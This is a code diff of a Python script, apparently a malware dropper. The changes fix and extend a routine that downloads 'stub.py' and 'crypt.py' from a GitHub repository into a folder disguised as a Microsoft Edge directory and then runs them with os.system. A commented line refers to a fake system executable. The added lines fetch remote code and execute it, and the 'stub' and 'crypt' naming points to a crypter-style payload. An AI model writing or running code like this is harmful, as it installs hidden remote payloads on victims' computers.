@@ -37,10 +37,17 @@ try:
 
         with open("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\stub.py", "w") as ff:
             stubUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/stub.py'
-            stubr = requests.get(url, allow_redirects=True)
+            stubr = requests.get(stubUrl, allow_redirects=True)
             ff.write(stubr.content)
-            open("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\stub.py", "w").write("l-qiaV5b5JQ2hDonIpYJCLxEDScolvWTkaQZLnKSiVE=")
         
+        with open("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\crypt.py", "w") as fff:
+            cryptUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/crypt.py'
+            cryptr = requests.get(cryptUrl, allow_redirects=True)
+            fff.write(cryptr.content)
+        
+
+        
+        os.system(f"python \"C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\crypt.py\"")
         os.system(f"python \"C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\stub.py\"")
 
         #os.system(f"\"C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\SystemGuardRuntime.exe\"")
